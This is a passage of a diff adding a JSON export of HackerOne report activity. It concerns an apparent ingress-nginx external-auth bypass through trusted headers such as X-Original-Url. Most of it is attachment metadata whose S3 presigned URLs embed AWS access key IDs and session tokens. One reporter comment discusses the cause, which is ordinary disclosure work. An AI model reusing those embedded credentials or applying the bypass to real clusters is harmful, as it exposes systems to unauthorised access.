7396b0a892f"
+                },
+                {
+                    "id": 1490477,
+                    "filename": "2021-10-22_21_00_41-powershell_(Admin).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hlo93nr8hs0dxyaowz2js178ujmi?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_00_41-powershell_%2528Admin%2529.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_00_41-powershell_%2528Admin%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070215Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bf32824cf429b2afb7fda48ad207047e8dc2eac8f9efab129458000febc668ce"
+                },
+                {
+                    "id": 1490470,
+                    "filename": "2021-10-22_20_49_28-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fs1mr6de4y0yw4p95eojnjnj7tnc?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_49_28-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_49_28-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ec175193315bcf1885afafacda11c7cc1e3ad526241da0b4c978d4c0a767982"
+                },
+                {
+                    "id": 1490468,
+                    "filename": "2021-10-22_20_48_15-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/h4l80pruyj3p2wfg2yipud34x6wl?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_48_15-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_48_15-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e2d64443fba29bdb7607785ecf7f71b38615f30b6a2d5d4c52f54f1b22335a79"
+                },
+                {
+                    "id": 1490467,
+                    "filename": "2021-10-22_20_47_08-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cjl7u0pbk9aaue349m0t9rzznfvd?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_47_08-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_47_08-README.md_-_k8s-ingress-auth-bypass_-_Visual_Studio_Code.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0e35c8bda5322619f487bd611b9fe7638423696f2edb04dcc72afc71c6129e08"
+                },
+                {
+                    "id": 1490465,
+                    "filename": "2021-10-22_20_44_31-powershell_(Admin).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qext4btacg9ia6hofq7wllfhaxib?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_44_31-powershell_%2528Admin%2529.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_44_31-powershell_%2528Admin%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=78a531568c28558ccfdc5bcdc2cf146ca06659d76fe4482f1d2e589cb85efe2a"
+                },
+                {
+                    "id": 1490464,
+                    "filename": "2021-10-22_20_43_37-powershell_(Admin).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/22fphrl50zuj6p321iwqc8ax1f4a?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_43_37-powershell_%2528Admin%2529.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_43_37-powershell_%2528Admin%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a6e38c04a0aa16de721fc9c7d5a23791c62dc778a7f1bd2b35618e3aad8c7c76"
+                },
+                {
+                    "id": 1490462,
+                    "filename": "2021-10-22_20_41_25-powershell_(Admin).png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8uwbgxs3i50jzbjti5zrdi0mfscx?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_20_41_25-powershell_%2528Admin%2529.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_20_41_25-powershell_%2528Admin%2529.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyRCfnbunOHDk2pYtjt8UqTt%2BBhymTvbpsaMBkU2zNMbMaBCSxP%2BRd3UBz%2F0fbbejowekjqh9eBzHhEc6qGI616WB2aXVs8vlVBz5zV8HPvqXuuW%2BfRW54g%2Bx1oXoID2hawO9UpJJ8CvBEBHKSD4Y3SUvEOMUNd9Q%2Bjagwsx9E%2B6U96jfnfP4cBKbgmJb5LLe4kv8sCU23OSx%2BNYctcz1lBdmzFentuatuWFfG2T4%2F%2FaWvHGutGIKk9WsQVLSQ2ukm7KZmNc1mBtKYfOZVrfBgyi4o%2FLf9RtD8VuXTfGanWEvKqWEZ1asfnqo4WDtz1mmgDFXUGFDWILksvkoWz0BrEBHcC2olhT0M7zOCHe5Fpyl7Zu5crMmd9iSbZook11BlLrHHD5usWTlyE6G3l7%2F1waBMUi%2FZjYZxsx0tbdZVTViVdoREuifbg1n4JUVWIRHTDWaPaT9RzZcXfgH%2FYZlOn4uu4kQpF4RFqyC%2BkHxQegEz9v0LTBjfyWam%2BX5%2B2UeMS7Sk4DKXaqGOOnzghbLwkEoF8%2BrsYBJFvDIbTmkS2PBjim%2FYwp6y2pwY6sAHU9keMWW5isD0IBaZbSwzLyKeRieUVfKRAszANLXwKAm0Gf%2Bfgf7NgziyA%2BfEk4bHKkum1X6gVfVbaiUvrDO86RLY9jXnoKri8dvK0gbP%2BeXHM69ySfKSonpMkaP3Tv4F15vog7n3%2Bk7hWoUAPQEKvNOnNyiJXemxUidHe2sE9uEDN0cINSKj%2B0YrjItqzUL1Mz8REg1eqeJXSvgIKMXQld%2FcV13rM%2F72wCNtSU16hzw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79d523f5d981351dda820a53f6542de27a5f41d8a39a407156fd01aba84259db"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "kubernetes"
+        },
+        {
+            "id": 14015021,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Problem explanation\n=============\n\nAfter doing some of experiments, I ask myself is this is really Kubernetes vulnerability or maybe someone else.\nLet's think about it.\nBug can be in:\n1. ingress-nginx\n2. nginx\n3. my custom code of auth-service\n\n### ingress-nginx\nIn ingress controller pod, you can find nginx.conf file that is containing following:\n{F1490502}\nAs you can see, it's ingress-nginx generated configuration that is setting those headers.\nYou can find relevant code generating this configuration in https://github.com/kubernetes/ingress-nginx/blob/af7d9581f47113f4e2cfd7fac92ba02ae9cd49f0/rootfs/etc/nginx/template/nginx.tmpl#L1020\n\n### ingress\nProbably yes. I don't know. That would be worth to talk about with Kubernetes security team.\n\n### my custom code of auth-service\nTrusting headers is usually bad idea ;) but in this case there is a lot of code in internet this is trusting at least X-Original-Url header. One of quite used in external auth scenario is: https://github.com/travisghansen/external-auth-server. There is request_js plugin (https://github.com/travisghansen/external-auth-server/blob/master/PLUGINS.md#request_js) which is exactly made for this case. There are describing it in documentation:\n{F1490513}\n\n@turtle_shell: I would like to thank you for time you are spending on this problem. It's not easy to reproduce scenarios that are based on minikube. I hope that my today explanation is helpful for you. In any case you can reach me. I'm happy to help.",
+            "automated_response": false,
+            "created_at": "2021-10-22T19:26:33.630Z",
+            "updated_at": "2021-10-22T19:26:33.630Z",
+            "actor": {
+                "username": "thisbug",
+                "cleared": false,
+                "verified": false,
+                "url": "/thisbug",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/iuetpgLdq7RdaaV7h44ZhjY3/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1490513,
+                    "filename": "2021-10-22_21_21_45-external-auth-server_PLUGINS.md_at_master___travisghansen_external-auth-server__.png",
+                    "type": "image/png",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/3aqz0x95u1e7zopgrzjgdg9tv3ld?response-content-disposition=attachment%3B%20filename%3D%222021-10-22_21_21_45-external-auth-server_PLUGINS.md_at_master___travisghansen_external-auth-server__.png%22%3B%20filename%2A%3DUTF-8%27%272021-10-22_21_21_45-external-auth-server_PLUGINS.md_at_master___travisghansen_external-auth-server__.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVHHA473M%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070216Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD7naWb%2FaxxY%2FPde0O8G82vs0NIocHwP5Sda56LFdZO0wIhAIOZA%2FcYG%2FTj6Uv%2B5cb6hT%2FFDDhoGckWykZixQmHRKNZKroFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzddy3Yxx37olt%2Boj4qjgUJ2lHl1hB7uiK%2BwvVo6KxaqudcwFHOfQHl37vyoLoin9zdSnBFL5RE5DGKARXGKTDhxv%2F05rCQasFxZD%2F%2BCUsklAmxmCwz8WJdbdbEvBrTQYenVXxCffV6tnq3TqpIuVdL8w38kNHALKUJKDhoRwtLUjGMNKii5qYZEL2BjxJDjsIq%2B%2FXOCiI5KoIKIlqQbS3LyNyPnkj8pSeG040C3OUtkjK0Bh8akAoEBz4T4oXuhfBSLUC6Ui2CJNPDHxkA%2F0ZUiT4bICnfKUQe9hnYI0G3sAZWX8%2B4NY6gCCc6eI0NlgkxA4T13tBIaqyR